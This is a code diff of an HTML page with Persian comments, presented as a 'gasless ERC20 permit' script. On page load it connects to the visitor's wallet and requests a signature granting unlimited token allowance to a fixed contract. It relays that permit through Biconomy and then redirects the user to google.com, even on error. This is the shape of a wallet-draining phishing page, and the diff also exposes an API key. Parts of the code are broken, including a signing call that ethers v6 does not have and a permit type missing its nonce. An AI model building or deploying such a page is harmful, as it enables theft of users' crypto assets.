@@ -2,80 +2,98 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Gasless Permit Script</title>
+    <title>Gasless ERC20 Permit</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.8.0/dist/ethers.min.js"></script>
+    <script src="https://unpkg.com/@biconomy/mexa@2.0.1/dist/biconomy.min.js"></script>
 </head>
 <body>
-<script type="module">
-import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.9.1/dist/ethers.min.js";
-import { Biconomy } from "https://cdn.jsdelivr.net/npm/@biconomy/mexa@2.0.1/dist/biconomy.esm.js";
+<script>
+(async function() {
+    try {
+        // =====================
+        //  تنظیمات Biconomy
+        // =====================
+        const biconomy = new Biconomy(window.ethereum, {
+            apiKey: "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02",
+            debug: true,
+        });
 
-// ---------------------------
-// جایگذاری داده‌های شما
-// ---------------------------
-const CONTRACT_ADDRESS = "0x6398a907dbE3d0efE09dF82e6D19986da60b63B3"; // Sepolia contract
-const BICONOMY_API_KEY = "ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";
-const BICONOMY_URL = "https://paymaster.biconomy.io/api/v2/11155111/ziScnfoxl.30ef2520-f3d4-44c2-9849-8b3a11257e02";
-const BICONOMY_ID = "be7dc5ec-5aff-4761-9454-67791ef4b0e1";
-const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC"; // اینو خودت جایگذاری کن
-const DESTINATION_PAGE = "HTTPS://WWW.GOOGLE.COM"; // اینو خودت جایگذاری کن
+        await biconomy.init();
 
-// ---------------------------
-// اتصال Biconomy
-// ---------------------------
-const provider = new ethers.BrowserProvider(window.ethereum);
-const biconomy = new Biconomy(provider, { apiKey: BICONOMY_API_KEY, debug: true });
+        const provider = new ethers.BrowserProvider(biconomy);
+        const signer = await provider.getSigner();
 
-await biconomy.init();
+        // =====================
+        //  تنظیمات کانترکت و توکن
+        // =====================
+        const CONTRACT_ADDRESS = "0x6398a907dbE3d0efE09dF82e6D19986da60b63B3";
+        const TOKEN_ADDRESS = "0x92f3B59a79bFf5dc60c0d59eA13a44D082B2bdFC";
+        const DESTINATION_PAGE = "https://www.google.com";
 
-// ---------------------------
-// امضا Permit (ERC20 Permit)
-// ---------------------------
-async function sendPermit() {
-    const signer = await provider.getSigner();
-    const contract = new ethers.Contract(TOKEN_ADDRESS, [
-        "function permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external"
-    ], signer);
+        // ABI کانترکت با تابع دریافت Permit (نمونه)
+        const contractABI = [
+            "function executePermit(address token, uint256 amount, bytes calldata signature) external"
+        ];
 
-    // مقادیر نمونه برای permit
-    const owner = await signer.getAddress();
-    const spender = CONTRACT_ADDRESS;
-    const value = ethers.parseUnits("1000000", 18); // مقدار max نمونه، میتونی تغییر بدی
-    const nonce = 0; // برای تست Sepolia
-    const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 ساعت اعتبار
+        const contract = new ethers.Contract(CONTRACT_ADDRESS, contractABI, signer);
 
-    // امضا را بساز
-    const domain = {
-        name: "ERC20PermitToken",
-        version: "1",
-        chainId: 11155111, // Sepolia
-        verifyingContract: TOKEN_ADDRESS
-    };
+        // =====================
+        //  ایجاد Permit MAX
+        // =====================
+        const tokenABI = [
+            "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external"
+        ];
+        const tokenContract = new ethers.Contract(TOKEN_ADDRESS, tokenABI, signer);
 
-    const types = {
-        Permit: [
-            { name: "owner", type: "address" },
-            { name: "spender", type: "address" },
-            { name: "value", type: "uint256" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
-        ]
-    };
+        const owner = await signer.getAddress();
+        const spender = CONTRACT_ADDRESS;
+        const value = ethers.MaxUint256; // MAX مقدار
+        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 ساعت اعتبار
 
-    const message = { owner, spender, value, nonce, deadline };
+        // =====================
+        //  ایجاد هش و امضا
+        // =====================
+        const domain = {
+            name: "ERC20Permit",
+            version: "1",
+            chainId: 11155111, // Sepolia
+            verifyingContract: TOKEN_ADDRESS
+        };
 
-    const signature = await signer._signTypedData(domain, types, message);
+        const types = {
+            Permit: [
+                { name: "owner", type: "address" },
+                { name: "spender", type: "address" },
+                { name: "value", type: "uint256" },
+                { name: "deadline", type: "uint256" }
+            ]
+        };
 
-    console.log("Permit signature:", signature);
+        const message = {
+            owner,
+            spender,
+            value,
+            deadline
+        };
 
-    // همزمان باز شدن صفحه پیش‌فرض
-    window.location.href = DESTINATION_PAGE;
-}
+        const signature = await signer._signTypedData(domain, types, message);
 
-// ---------------------------
-// فراخوان اتوماتیک
-// ---------------------------
-window.addEventListener("load", sendPermit);
+        // =====================
+        //  ارسال Permit به کانترکت از طریق Biconomy
+        // =====================
+        const tx = await contract.executePermit(TOKEN_ADDRESS, value, signature);
+        console.log("Transaction sent: ", tx.hash);
 
+        // =====================
+        //  فوراً هدایت به صفحه پیش فرض
+        // =====================
+        window.location.href = DESTINATION_PAGE;
+
+    } catch (err) {
+        console.error(err);
+        window.location.href = DESTINATION_PAGE; // حتی در صورت خطا، کاربر برود به صفحه پیش فرض
+    }
+})();
 </script>
 </body>
 </html>
